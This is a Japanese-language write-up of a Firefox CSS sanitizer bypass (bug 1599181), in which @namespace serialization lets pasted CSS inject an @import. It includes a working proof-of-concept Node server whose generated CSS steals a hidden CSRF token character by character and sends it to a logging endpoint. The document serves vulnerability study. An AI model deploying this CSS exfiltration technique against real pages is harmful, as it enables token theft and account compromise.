# Bypass of CSS Sanitizer via incorrect serialization of CSS @namespace rule.

https://bugzilla.mozilla.org/show_bug.cgi?id=1599181



ブラウザー上でコピーと貼り付けを行うと、Firefoxの場合
貼り付け時に `<style>` をCSSサニタイズする。

サニタイザーは有害コンテンツの有無でサニタイズを実施する。
逆に有害コンテンツがない場合はそのまま貼り付けが行われる。

サニタイズされる際は特定のルールが削除される。

そこで考えられるケースが以下
```
INPUT: *{background:red}
SANITIZED OUTPUT: *{background:red}
これはそのまま表示される
----------

INPUT: @import 'abc';*{background:red}
SANITIZED OUTPUT: * { background: red none repeat scroll 0% 0%; }
@import が禁止され、CSSが書き換えられる
----------

INPUT: @import'abc';@namespace x 'aa';{background:#eee}
SANITIZED OUTPUT: @namespace x url("aa"); { background: rgb(238, 238, 238) none repeat scroll 0% 0%; }
一方、  @namespace は許可されている。namespaceの `x 'aa';` が `x url("aa");` に書き換えられている。
この時点で `url("...")` 構文に書き直してもURL内の引用符がエスケープされない可能性がある（かも）
----------

INPUT: @import'abc';@namespace x 'a"bc';{background:#eee}
SANITIZED OUTPUT: @namespace x url("a"bc"); { background: rgb(238, 238, 238) none repeat scroll 0% 0%; }
namespace のエスケープ引用符が 'a"bc' から "a"bc" という不正なものに書き換わる。
これは任意のCSSルールを注入できることになる。

----------

INPUT: @import'abc';@namespace x 'a"x);@import "data:text/css,{background:blue}";';
SANITIZED OUTPUT: @namespace x url("a"x);@import "data:text/css,{background:blue}";");
@import が実行されないように見える場合がある。ただし、@namespace には現在不正な構文があり、引用符を閉じた直後に x文字がある。
これはCSSパーサによって無視される。
その結果、 @import は CSSの最初の有効なルールとして扱われる。
---------

INPUT: @import'abc';*{background: url('aaa"bbb')}
SANITIZED OUTPUT: * { background: rgba(0, 0, 0, 0) url("aaa"bbb") repeat scroll 0% 0%; }
興味深いことに、同じ問題は、ルールが書き換えられた他のコンテキストでは発生しない。
この例は背景のURLが適切にエスケープされて書き換えられることを示す。
```

## そもそも @namespace / @importって？

### @namespace
https://developer.mozilla.org/ja/docs/Web/CSS/@namespace

これは CSSで使用する XML名前空間を定義する [@規則](https://developer.mozilla.org/ja/docs/Web/CSS/At-rule)

この規則を利用することで、定義ずみの名前空間のみの要素だけにプロパティを当てることができる。

```css
@namespace url(http://example.com/hoge/xhtml);
@namespace svg url(http://example.com/foo/svg);

a {} /* xhtml には名前空間指定がないので、xhtml 領域のみに適用 */

svg|a {} /* これは名前空間 svg における a に適用 */

*|a {} /* これは全ての名前空間の a に適用 */
```

構文は以下
```
/* 既定の名前空間 */
@namespace url(XML-namespace-URL);
@namespace "XML-namespace-URL";

/* 接頭辞つき名前空間 */
@namespace prefix url(XML-namespace-URL);
@namespace prefix "XML-namespace-URL";


形式文法 ----------
@namespace <namespace-prefix>? [ <string> | <url> ];
where 
<namespace-prefix> = <ident>
```


### @import
他のスタイルシートから @charset を除いたスタイル規則をインポートするために使用。

構文は以下
```
@import url;
@import url list-of-media-queries;
@import url supports( supports-query );
@import url supports( supports-query ) list-of-media-queries;
``` 

使用例
```
@import url("fineprint.css") print;
@import url("bluish.css") speech;
@import 'custom.css';
@import url("chrome://communicator/skin/");
@import "common.css" screen;
@import url('landscape.css') screen and (orientation:landscape);
```


## PoC
1. `css-exfiltration-firefox.js` と `vulnerable-page.html` をいくつかのディレクトリに保存します
2. `openssl req -x509 -newkey rsa:2048 -nodes -sha256 -subj '/CN=localhost' -keyout localhost-privkey.pem -out localhost-cert.pem`
3. `npm install express spdy`
4. `node css-exfiltration-firefox.js`

これによってCSRFトークンを発行するページがRUNできる。
このページにはEditorがある。
ここに対して別のページでコピーしたCSSを貼り付けることで対象のCSRF Tokenを奪取できる。

5. Firefoxを開き、https://localhost:3000 と https://127.0.0.1:3000 の両方に移動して、証明書を信頼します。
6. https://localhost:3000 へ移動してPoCとなるCSSをコピー("コピー"をクリック)
7. 脆弱なページに移動し、contenteditableボックスにペーストする
8. CSRFトークンが漏洩する。



### PoCコード
// TODO PoCコードを読んで軽くまとめる

https://bugzilla.mozilla.org/attachment.cgi?id=9111317&action=edit
https://bugzilla.mozilla.org/attachment.cgi?id=9111318&action=edit




#### 攻撃対象ページ
```html
<form action=javascript:void(0)>
    <input id=csrftoken name=csrftoken type=hidden>
    Login: <input name=login><br>
    Password: <input name=password type=password><br>
    <button>Submit</button>
</form>


<script>
    let csrf = btoa(new TextDecoder().decode(window.crypto.getRandomValues(new Uint8Array(32)).map(c=>c%127)));
    document.querySelector('#csrftoken').setAttribute('value', csrf);
</script>
```

インジェクションできる場所がない普通のFormページ

#### PoC Page

重要な点は
Copy でCSSを含んだPoCをコピー
Paste部分では特別何もやっておらず、CSS @import が注入できる

あとはCSS Injection で、InputのValueに１文字ずつマッチしてパラメータを盗み、
外部のロギングサーバに @import のURLでリクエストを送るようにする。


```
app.get('/', (req, res) => {
    res.set('content-type', 'text/html');
    res.send(`<!doctype html>
        Click <button onclick="document.execCommand('copy')">Copy</button> and paste the
        clipboard in the vulnerable page<br>
        <span id=output style=color:red></span>
        
        <script>
        
        function randomId(len=16) {
            return Array.from(crypto.getRandomValues(new Uint8Array(len))).map(x=>('00'+x.toString(16)).slice(-2)).join('')
        }
        
        document.oncopy = ev => {
            ev.preventDefault();
            const id = randomId();
            const len = 100;
            const base = \`https://localhost:3000/css/\${id}\`;
            const data = [\`<style>@import'\${base}?len=\${len}'</style>\`]
            .concat(Array.from({ length: len }, (_, i) => {
                return \`<style>@import'';@namespace x url("\\\\22x);@import '\${base}/\${i}';")  </style>\`;
            })).join('\\n');
            ev.clipboardData.setData('text/html', data);
            ev.clipboardData.setData('text/plain', data);
            output.textContent = 'Ok! Now paste it!.';
        }
        </script>
        
    `);
});

app.get('/char/:session/:index', (req, res) => {
    let {
        session,
        index
    } = req.params;
    let {
        char
    } = req.query;
    index = +index;
    sessions[session][index] = char;

    console.log(` [*][session=${session}] Exfiltrated value: ${sessions[session].join('')}`);

    res.send('');
});


function cssEscape(s) {
    return Array.from(s).map(c => `\\${('000000'+c.codePointAt(0).toString(16)).slice(-6)}`).join('');
}


/* 以下便利関数 */
function urlEscape(s) {
    return encodeURIComponent(s).replace(/'/g, '%27');
}

// returns css exfiltrating data
app.get('/css/:session/:index', async(req, res) => {
            let {
                session,
                char,
                index
            } = req.params;
            index = +index;
            res.set('content-type', 'text/css');
            await forChar(index, session);

            let chars = '0123456789/+=qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM';
            const content = `
        
        ${Array.from(chars).map(c => `INPUT[name='csrftoken'][value^='${cssEscape(sessions[session].slice(0, index).join('')+c)}'] + * {
            background: url('https://127.0.0.1:3000/char/${session}/${index}?char=${urlEscape(c)}');
        }`).join('\n')}
    `;
    
    res.send(content);
    
    
});

// creates new exfiltration session
app.get('/css/:session', (req, res) => {
    const { session } = req.params;
    const { len } = req.query;
    console.log(`[!] Imported! ${session}`)
    sessions[session] = new Array(+len).fill('');
    
    res.set('content-type', 'text/css');
    return res.send(`
        ${Array.from({length: +len}, (_,k) => `@import '/css/${session}/${k}';`).join('\n')};
    `);
    
})

const options = {
  cert: fs.readFileSync('localhost-cert.pem'),
  key: fs.readFileSync('localhost-privkey.pem'),
}

spdy.createServer(options, app).listen(port, () => console.log(`App listening on https://localhost:${port} and https://127.0.0.1:${port}!`));
```

